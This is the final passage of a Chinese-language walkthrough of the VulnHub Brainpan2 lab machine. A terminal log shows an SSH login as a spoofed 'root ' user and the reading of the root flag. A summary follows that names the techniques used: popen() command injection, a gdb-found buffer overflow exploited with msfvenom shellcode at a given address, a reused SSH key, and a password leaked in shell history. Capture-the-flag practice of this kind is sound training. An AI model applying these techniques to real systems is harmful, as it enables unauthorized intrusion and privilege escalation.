+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan2:/home/puck$ ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">ssh -l <span class="string">&quot;root &quot;</span> brainpan2 -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[brainpan2]:2222 ([127.0.1.1]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[brainpan2]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 11:00:06 2013</span></span><br><span class="line"><span class="string">root @brainpan2:~# id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root ) gid=0(root ) groups=0(root )</span></span><br><span class="line"><span class="string">root @brainpan2:~# whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root </span></span><br><span class="line"><span class="string">root @brainpan2:~# cd /root</span></span><br><span class="line"><span class="string">cd /root</span></span><br><span class="line"><span class="string">root @brainpan2:/root# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">flag.txt  whatif.txt</span></span><br><span class="line"><span class="string">root @brainpan2:/root# cat flag.txt</span></span><br><span class="line"><span class="string">cat flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          !!! CONGRATULATIONS !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 You&#x27;</span>ve completed the Brainpan 2 challenge! </span><br><span class="line">                 Or have you...? </span><br><span class="line"></span><br><span class="line">                 Yes, you have! Pat yourself on the back. :-)</span><br><span class="line"></span><br><span class="line">                 Questions, comments, suggestions <span class="keyword">for</span> new VM</span><br><span class="line">                 challenges? Let me know! </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Twitter: @superkojiman</span><br><span class="line">                 Email  : contact@techorganic.com</span><br><span class="line">                 Web    : http://www.techorganic.com</span><br><span class="line"></span><br><span class="line">root @brainpan2:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg"></p>
+<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
+<li>popen()执行多个命令获取shell</li>
+<li>gdb调试寻找缓冲区溢出的地址</li>
+<li>msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权</li>
+<li>更换成ssh备份的私匙，连接具有root权限的ssh</li>
+<li>.bash_history中的ssh连接历史中ssh密码泄露</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/02/01/brainpan2/" title="vulnhub靶机渗透[brainpan2]">https://fdlucifer.github.io/2020/02/01/brainpan2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/26/brainpan-1/" rel="prev" title="vulnhub靶机渗透[brainpan-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[brainpan-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/02/03/brainpan-3/" rel="next" title="vulnhub靶机渗透[brainpan-3]">
+                  vulnhub靶机渗透[brainpan-3] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
